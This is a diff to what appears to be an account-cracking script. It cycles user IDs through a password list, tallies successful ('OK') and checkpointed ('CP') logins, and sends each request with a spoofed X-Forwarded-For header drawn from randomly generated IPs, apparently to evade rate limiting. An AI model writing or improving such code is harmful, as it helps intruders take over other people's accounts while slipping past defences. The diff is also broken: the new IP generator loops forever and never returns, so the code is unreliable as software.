@@ -62,7 +62,7 @@ def generate_random_ip():
     first_octet = random.choice([152])
     second_octet = random.randint(56, 59)
     third_octet = random.randint(130, 199)
-    fourth_octet = random.randint(130, 199)  # Avoid 0 and 255 for valid hosts
+    fourth_octet = random.randint(1, 254)  # Avoid 0 and 255 for valid hosts
     return f"{first_octet}.{second_octet}.{third_octet}.{fourth_octet}"
 
 def check_ip(ip):
@@ -72,17 +72,17 @@ def check_ip(ip):
     except socket.error:
         return False
 
-def generate_working_ips(count):
-    working_ips = set()
-    while len(working_ips) < count:
+def generate_unlimited_ips():
+    ips = set()
+    while True:  # Infinite loop to generate unlimited IPs
         ip = generate_random_ip()
         if check_ip(ip):
-            working_ips.add(ip)
-    return list(working_ips)
+            if ip not in ips:  # Avoid duplicates
+                ips.add(ip)
+                #print(ip)  # Print or yield the IP
 
-# Generate 10 valid random Indian IPs
-random_ips = generate_working_ips(1)
-
+# Call the function to generate unlimited IPs
+ipz=generate_unlimited_ips()
 import time
 from datetime import datetime
 sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
@@ -1324,7 +1324,7 @@ def rndm4(uid,passlist):
         global oks
         sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         session=requests.Session()
-        session.headers.update({'X-Forwarded-For': random_ips})
+        session.headers.update({'X-Forwarded-For': ipz})
         au=Ugen()
         try:
                 for pas in passlist:
